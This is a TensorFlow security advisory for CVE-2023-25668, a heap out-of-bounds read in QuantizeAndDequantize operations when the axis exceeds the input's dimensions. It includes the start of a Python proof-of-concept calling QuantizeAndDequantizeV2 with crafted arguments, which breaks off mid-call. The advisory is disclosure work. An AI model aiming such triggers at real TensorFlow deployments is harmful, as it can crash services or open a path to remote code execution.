<h2>TFSA-2023-002: A heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation</h2>
<h3>CVE Number</h3>
<p>CVE-2023-25668</p>
<h3>Impact</h3>
<p>Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
When axis is larger than the dim of input, c-&gt;Dim(input,axis) goes out of bound.
Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
<code>python
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
                                       input_min=[1.0],
                                       input_max=[10.0],
                                       signed_input=True,
                                       num_bits=1,
                                       range_given=True,
                                       round_mode='HALF_TO_EVEN',
